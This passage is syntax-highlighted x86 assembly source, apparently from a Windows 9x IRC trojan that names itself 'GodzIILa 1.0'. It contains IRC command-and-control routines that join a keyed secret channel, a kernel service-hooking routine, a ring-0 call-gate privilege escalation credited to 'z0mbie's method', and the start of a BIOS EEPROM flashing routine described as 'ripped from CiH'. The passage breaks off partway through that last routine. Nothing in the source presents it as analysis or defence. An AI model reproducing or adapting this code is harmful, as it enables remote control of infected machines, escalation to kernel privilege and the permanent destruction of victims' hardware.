            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">socket_handle</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">recv</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__check_blocking</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__read</span><span class="sc0">
    
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_recv_buffer</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_logline</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">__check_blocking</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WSAGetLastError</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WSAEWOULDBLOCK</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__read</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; numba of chars in line</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; save ptr to last char</span><span class="sc0">

            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; sends JOIN and MODE comz do irc server, skips crap and waits for </span><span class="sc0">
</span><span class="sc1">; 'End of /NAMES list'.</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">join_channel</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">JOIN</span><span class="sc0"> #</span><span class="sc5">trojan_test</span><span class="sc0"> </span><span class="sc5">guzonja</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">25</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send_crlf</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MODE</span><span class="sc0"> #</span><span class="sc5">trojan_test</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">k</span><span class="sc0"> </span><span class="sc5">guzonja</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">28</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send_crlf</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MODE</span><span class="sc0"> #</span><span class="sc5">trojan_test</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">s</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">20</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send_crlf</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__err</span><span class="sc0">

</span><span class="sc5">__ch_recv</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_line</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">CRLF_HEX</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'.t'</span><span class="sc0">     </span><span class="sc1">; End of /NAMES list.</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ch_recv</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'sil '</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ch_recv</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SEMA'</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ch_recv</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PRIVMSG</span><span class="sc0"> #</span><span class="sc5">trojan_test</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc5">GodzIILa</span><span class="sc0"> </span><span class="sc2">1.0</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">34</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send_crlf</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">IRC_LOG</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; logs buffer to logfile</span><span class="sc0">
</span><span class="sc1">; i: ecx = buffer size</span><span class="sc0">
</span><span class="sc1">;    irc_recv_buffer = ptr to buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: nothing</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">irc_logline</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">irc_recv_buffer</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">bot_log_handle</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WriteFile</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; IRC_LOG</span><span class="sc0">

</span><span class="sc5">irc_send_crlf</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CRLF_HEX</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; writes data to socket</span><span class="sc0">
</span><span class="sc1">; i: ecx = numba of bytes</span><span class="sc0">
</span><span class="sc1">;    esi = ptr to data to send</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">irc_send</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">IRC_LOG</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">bot_log_handle</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WriteFile</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; IRC_LOG</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">socket_handle</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">send</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">lowercase</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">__loop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__skip</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__skip</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">__skip</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__loop</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">CGS</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">                           </span><span class="sc1">; CallGate Selector</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; manually hooks a service</span><span class="sc0">
</span><span class="sc1">; i: ecx = ptr to DDB</span><span class="sc0">
</span><span class="sc1">;    ebx = service to hook</span><span class="sc0">
</span><span class="sc1">;    esi = hooking procedure</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: esi = original service handler</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">hook_service</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; take ptr to service ptr table</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; xchg ptr to service and ptr to hooking procedure</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; builds callgate in the LDT, infamous z0mbie's method</span><span class="sc0">
</span><span class="sc1">; i: esi = ptr to FAR subroutine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: nothing</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">call_in_ring0</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; EBX &lt;-- GDT.base</span><span class="sc0">
                        </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; EAX &lt;-- LDT selector</span><span class="sc0">
                        </span><span class="sc6">sldt</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">111b</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; selector --&gt; index*8</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; EBX &lt;-- LDT descriptor offs</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ECX &lt;-- LDT.base</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">CGS</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EDI &lt;-- CG descriptor offs</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; build CallGate</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1110110000000000b</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">
                        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09Ah</span><span class="sc0">            </span><span class="sc1">; call 28:&lt;esi&gt;</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; unused, any number</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">CGS</span><span class="sc4">+</span><span class="sc2">100b</span><span class="sc4">+</span><span class="sc2">11b</span><span class="sc0">    </span><span class="sc1">; LDT+R3</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; well done</span><span class="sc0">

</span><span class="sc5">patchspc</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endspc</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">patchcr</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endcr</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; generates random string </span><span class="sc0">
</span><span class="sc1">; i: ebx = max string length</span><span class="sc0">
</span><span class="sc1">;    edi = ptr to string storage buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: irc_nick = generated nick</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GenRandString</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">rdtsc</span><span class="sc0">
            </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">__gen_letter</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">rdtsc</span><span class="sc0">
            </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'Z'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">rdtsc</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">99</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; Sleep</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__gen_letter</span><span class="sc0">
            
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; flash EEPROM, ripped from CiH</span><span class="sc0">
</span><span class="sc1">; i: call from r0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: nothing</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">cihflash</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cf8h</span><span class="sc0">

</span><span class="sc1">; * Show BIOS Page in 000E0000 - 000EFFFF    (   64 KB   )</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000384ch</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cfeh</span><span class="sc0">
                        </span><span class="sc6">cli</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IOForEEPROM</span><span class="sc0">

</span><span class="sc1">; * Show BIOS Page in 000F0000 - 000FFFFF   (   64 KB   )</span><span class="sc0">

